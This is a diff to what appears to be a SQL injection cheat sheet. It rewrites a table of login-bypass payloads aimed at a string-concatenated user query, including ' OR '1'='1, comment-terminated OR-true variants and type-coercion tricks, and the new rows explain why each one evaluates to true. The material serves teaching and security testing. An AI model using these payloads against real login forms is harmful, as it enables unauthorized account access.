@@ -144,15 +144,15 @@ Given the query:
 SELECT * FROM users WHERE username = '{input}' AND password = '{pass}';
 ```
 
-| Test Payload      | Description                      |
-| ----------------- | -------------------------------- |
-| `' OR '1`         | Unclosed quote absorbed by query |
-| `' OR 1 -- -`     | OR true with comment             |
-| `" OR "" = "`     | Double quote variant             |
-| `" OR 1 = 1 -- -` | Double quote with comment        |
-| `'='`             | Empty string equals empty string |
-| `'LIKE'`          | Empty LIKE empty is true         |
-| `'=0--+`          | Type coercion bypass             |
+| Test Payload      | Description                                                                              |
+| ----------------- | ---------------------------------------------------------------------------------------- |
+| `' OR '1'='1`     | Balanced quotes: closes string, adds OR true, query's closing quote completes the pair   |
+| `' OR 1 -- -`     | OR 1 (always true), `--` comments out rest; trailing `-` ensures space after `--`        |
+| `" OR "" = "`     | Double quote variant: `"" = "` evaluates to true (empty string equals empty)             |
+| `" OR 1 = 1 -- -` | Double quote with comment: works if server uses double-quoted strings                    |
+| `'='`             | Becomes `WHERE col = ''=''` → empty string equals empty string → true                    |
+| `'LIKE'`          | Becomes `WHERE col = '' LIKE ''` → empty string LIKE empty pattern → true                |
+| `'=0--`           | Type coercion: `''=0` → empty string coerced to 0 → `0=0` → true; `--` comments out rest |
 
 ### Unclosed Quote Injection
 
